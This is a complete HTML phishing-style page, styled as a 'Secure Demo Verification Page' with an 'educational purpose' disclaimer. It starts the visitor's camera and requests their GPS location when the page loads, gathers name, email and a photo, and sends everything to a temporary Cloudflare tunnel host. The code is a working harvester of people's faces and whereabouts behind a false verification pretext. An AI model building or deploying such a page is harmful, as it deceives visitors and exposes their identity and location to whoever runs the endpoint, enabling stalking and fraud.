<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Secure Demo Page</title>

<style>
body {
  font-family: 'Segoe UI', sans-serif;
  background: #f5f5f5;
  margin: 0;
  color: #333;
}

header {
  background: #0077cc;
  color: white;
  padding: 20px;
  text-align: center;
}

.container {
  max-width: 700px;
  margin: 30px auto;
  padding: 20px;
  background: white;
  border-radius: 10px;
  box-shadow: 0 0 10px rgba(0,0,0,0.1);
}

.disclaimer {
  background: #fff3cd;
  color: #856404;
  padding: 10px;
  border-radius: 6px;
  text-align: center;
  margin-bottom: 20px;
  font-size: 14px;
}

.form-group {
  margin-bottom: 18px;
}

label {
  font-weight: bold;
  display: block;
  margin-bottom: 6px;
}

input {
  width: 100%;
  padding: 10px;
  border-radius: 5px;
  border: 1px solid #ccc;
  font-size: 15px;
}

button {
  width: 100%;
  padding: 12px;
  background: #0077cc;
  border: none;
  border-radius: 6px;
  color: white;
  font-size: 16px;
  cursor: pointer;
}

button:hover {
  background: #005fa3;
}

video, img {
  width: 100%;
  border-radius: 6px;
  margin-top: 10px;
}

.tracking {
  font-size: 14px;
  color: #555;
  margin-top: 15px;
}

.or {
  text-align: center;
  font-weight: bold;
  margin: 10px 0;
}
</style>
</head>

<body>

<header>
  <h1>Secure Demo Verification Page</h1>
  <p>Educational Purpose Only</p>
</header>

<div class="container">

  <div class="disclaimer">
    ⚠️ Demo Project Only for education purpose 
  </div>

  <form id="demoForm">

    <div class="form-group">
      <label>Full Name</label>
      <input type="text" id="name" required />
    </div>

    <div class="form-group">
      <label>Email Address</label>
      <input type="email" id="email" required />
    </div>

    <!-- CAMERA CAPTURE -->
    <div class="form-group">
      <label>Live Camera Capture</label>
      <video id="video" autoplay></video>
      <button type="button" id="captureBtn">Capture Photo</button>
    </div>

    <div class="or">OR</div>

    <!-- GALLERY UPLOAD -->
    <div class="form-group">
      <label>Select Photo from Gallery</label>
      <input type="file" id="galleryInput" accept="image/*" />
    </div>

    <!-- PREVIEW -->
    <div class="form-group">
      <label>Photo Preview</label>
      <img id="preview" style="display:none;" />
    </div>

    <!-- LOCATION -->
    <div class="tracking">
      Location: <span id="location">Requesting...</span>
    </div>

    <br>
    <button type="submit">Submit Demo</button>

  </form>

</div>

<script>
/* ================= CAMERA & GALLERY ================= */
const video = document.getElementById("video");
const captureBtn = document.getElementById("captureBtn");
const preview = document.getElementById("preview");
const galleryInput = document.getElementById("galleryInput");

let capturedImage = null;
let userLocation = { latitude: null, longitude: null };

// Camera permission
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => video.srcObject = stream)
  .catch(() => console.log("Camera denied"));

// Capture from camera
captureBtn.onclick = () => {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);
  capturedImage = canvas.toDataURL("image/png");
  preview.src = capturedImage;
  preview.style.display = "block";
};

// Gallery upload
galleryInput.onchange = () => {
  const file = galleryInput.files[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = e => {
    capturedImage = e.target.result;
    preview.src = capturedImage;
    preview.style.display = "block";
  };
  reader.readAsDataURL(file);
};

/* ================= LOCATION ================= */
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    pos => {
      userLocation.latitude = pos.coords.latitude;
      userLocation.longitude = pos.coords.longitude;
      document.getElementById("location").textContent =
        `Lat: ${userLocation.latitude}, Lng: ${userLocation.longitude}`;
    },
    () => {
      document.getElementById("location").textContent = "Permission denied";
    }
  );
}

/* ================= FORM SUBMISSION TO VERCEL BACKEND ================= */
document.getElementById("demoForm").onsubmit = e => {
  e.preventDefault();

  const name = document.getElementById("name").value;
  const email = document.getElementById("email").value;

  if (!capturedImage) {
    alert("Please capture or upload a photo first!");
    return;
  }

  const data = {
    name,
    email,
    photo: capturedImage,
    location: userLocation
  };

  fetch("https://axis-would-traveler-powered.trycloudflare.com/api/send", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  })
  .then(res => res.json())
  .then(response => {
    alert("Backend Response: " + response.message);
  })
  .catch(err => {
    console.error("Error:", err);
    alert("Failed to send data!");
  });
};
</script>

</body>
</html>
